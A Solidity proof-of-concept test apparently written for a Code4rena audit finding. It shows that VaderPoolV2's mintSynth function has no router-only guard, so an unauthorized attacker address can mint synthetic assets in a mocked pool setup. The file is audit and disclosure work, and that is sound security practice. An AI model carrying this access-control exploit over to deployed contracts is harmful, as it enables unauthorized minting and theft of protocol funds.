// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.9;

import "contracts/dex-v2/pool/VaderPoolV2.sol";
import "contracts/interfaces/dex-v2/synth/ISynth.sol";
import "./src/Mocks.sol";

interface Vm {
    function prank(address sender) external;
}

/// @title PoC: mintSynth missing router restriction
/// @notice Demonstrates that an unauthorized caller (not the router) can call
///         VaderPoolV2.mintSynth and receive freshly minted synths, because the
///         function carries no onlyRouter guard. Matches C4 H-13.
contract PoC_MintSynth {
    Vm private constant vm = Vm(
        address(uint160(uint256(keccak256("hevm cheat code"))))
    );

    address private constant DEPLOYER = address(0xD0DB);
    address private constant ROUTER = address(0xE7E7); // authorized pool caller
    address private constant ATTACKER = address(0xA11CE); // unauthorized caller

    VaderPoolV2 private target;
    ERC20Mock private native;
    ERC20Mock private foreign;
    SynthFactoryMock private synthFactory;
    WrapperMock private wrapper;
    ISynth private synth;

    uint256 private constant SEED_NATIVE = 1_000_000e18;
    uint256 private constant SEED_FOREIGN = 1_000_000e18;

    function setUp() public {
        vm.prank(DEPLOYER);
        native = new ERC20Mock("USDC", "USDC");
        vm.prank(DEPLOYER);
        foreign = new ERC20Mock("FOREIGN", "FOR");
        vm.prank(DEPLOYER);
        ERC20Mock synthToken = new ERC20Mock("SYNTH-USDC", "sUSDC");
        synth = ISynth(address(synthToken));

        vm.prank(DEPLOYER);
        synthFactory = new SynthFactoryMock();
        vm.prank(DEPLOYER);
        wrapper = new WrapperMock();
        vm.prank(DEPLOYER);
        target = new VaderPoolV2(true, native);

        // wire the pool as the protocol does after deployment
        vm.prank(DEPLOYER);
        target.setTokenSupport(foreign, true);
        vm.prank(DEPLOYER);
        target.initialize(ILPWrapper(address(wrapper)), synthFactory, ROUTER);
        vm.prank(DEPLOYER);
        synthFactory.setSynth(foreign, synth);
        vm.prank(DEPLOYER);
        wrapper.setToken(foreign, ERC20Mock(address(synth)));

        // protocol deployer seeds a funded native/foreign pair via the router
        vm.prank(ROUTER);
        native.mint(ROUTER, SEED_NATIVE);
        vm.prank(ROUTER);
        foreign.mint(ROUTER, SEED_FOREIGN);
        vm.prank(ROUTER);
        native.approve(address(target), SEED_NATIVE);
        vm.prank(ROUTER);
        foreign.approve(address(target), SEED_FOREIGN);
        vm.prank(ROUTER);
        target.mint(foreign, SEED_NATIVE, SEED_FOREIGN, ROUTER, ROUTER);
    }

    function test_exploit() public {
        vm.prank(ATTACKER);
        native.mint(ATTACKER, 100e18);
        vm.prank(ATTACKER);
        native.approve(address(target), 100e18);

        uint256 synthBefore = synth.balanceOf(ATTACKER);

        // unauthorized caller calls an only-router-style privileged function
        vm.prank(ATTACKER);
        target.mintSynth(foreign, 100e18, ATTACKER, ATTACKER);

        uint256 synthMinted = synth.balanceOf(ATTACKER) - synthBefore;
        // impact: unauthorized caller received freshly minted synthetic assets
        require(synthMinted > 0, "exploit impact was not observed");
    }
}